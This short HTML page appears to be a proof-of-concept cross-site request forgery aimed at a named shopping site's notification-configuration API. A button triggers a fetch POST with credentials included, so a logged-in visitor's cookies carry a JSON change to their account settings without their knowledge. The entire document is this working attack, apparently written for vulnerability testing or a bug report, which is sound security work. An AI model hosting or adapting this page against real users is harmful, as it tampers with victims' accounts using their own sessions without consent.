<!DOCTYPE html>
<html>
  <body>
    <h3>Click to trigger JSON CSRF request</h3>
    <button onclick="sendCSRF()">Send CSRF</button>

    <script>
      function sendCSRF() {
        fetch("https://www.temu.com/api/bg-barbera-api/setting/notification/configure", {
          method: "POST",
          credentials: "include",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ id: 100, status: 1 })
        }).then(res => {
          console.log("Request sent. Status:", res.status);
        }).catch(err => {
          console.error("CSRF request blocked:", err);
        });
      }
    </script>
  </body>
</html>
